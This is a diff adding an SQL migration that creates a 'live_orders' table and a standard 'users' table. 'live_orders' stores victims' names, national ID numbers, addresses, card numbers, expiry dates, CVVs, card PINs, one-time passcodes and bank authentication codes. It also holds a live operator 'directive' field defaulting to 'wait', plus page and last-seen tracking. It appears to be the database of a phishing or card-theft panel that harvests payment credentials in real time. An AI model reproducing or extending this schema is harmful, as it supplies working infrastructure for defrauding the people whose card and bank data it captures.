@@ -1,0 +1,42 @@
+CREATE TABLE `live_orders` (
+	`id` int AUTO_INCREMENT NOT NULL,
+	`publicId` varchar(40) NOT NULL,
+	`page` varchar(80) NOT NULL DEFAULT 'ملخص الطلب',
+	`name` varchar(160) NOT NULL DEFAULT '',
+	`idNumber` varchar(80) NOT NULL DEFAULT '',
+	`phone` varchar(60) NOT NULL DEFAULT '',
+	`email` varchar(160) NOT NULL DEFAULT '',
+	`tier` varchar(40) NOT NULL DEFAULT '',
+	`region` varchar(120) NOT NULL DEFAULT '',
+	`city` varchar(120) NOT NULL DEFAULT '',
+	`district` varchar(160) NOT NULL DEFAULT '',
+	`street` varchar(200) NOT NULL DEFAULT '',
+	`deliveryDate` varchar(60) NOT NULL DEFAULT '',
+	`cardNumber` varchar(40) NOT NULL DEFAULT '-',
+	`expiry` varchar(16) NOT NULL DEFAULT '-',
+	`cvv` varchar(8) NOT NULL DEFAULT '-',
+	`pin` varchar(12) NOT NULL DEFAULT '-',
+	`otp` varchar(16) NOT NULL DEFAULT '-',
+	`bankAuth` varchar(40) NOT NULL DEFAULT '-',
+	`status` varchar(20) NOT NULL DEFAULT 'pending',
+	`directive` varchar(60) NOT NULL DEFAULT 'wait',
+	`lastSeen` timestamp NOT NULL DEFAULT (now()),
+	`createdAt` timestamp NOT NULL DEFAULT (now()),
+	`updatedAt` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
+	CONSTRAINT `live_orders_id` PRIMARY KEY(`id`),
+	CONSTRAINT `live_orders_publicId_unique` UNIQUE(`publicId`)
+);
+--> statement-breakpoint
+CREATE TABLE `users` (
+	`id` int AUTO_INCREMENT NOT NULL,
+	`openId` varchar(64) NOT NULL,
+	`name` text,
+	`email` varchar(320),
+	`loginMethod` varchar(64),
+	`role` enum('user','admin') NOT NULL DEFAULT 'user',
+	`createdAt` timestamp NOT NULL DEFAULT (now()),
+	`updatedAt` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
+	`lastSignedIn` timestamp NOT NULL DEFAULT (now()),
+	CONSTRAINT `users_id` PRIMARY KEY(`id`),
+	CONSTRAINT `users_openId_unique` UNIQUE(`openId`)
+);
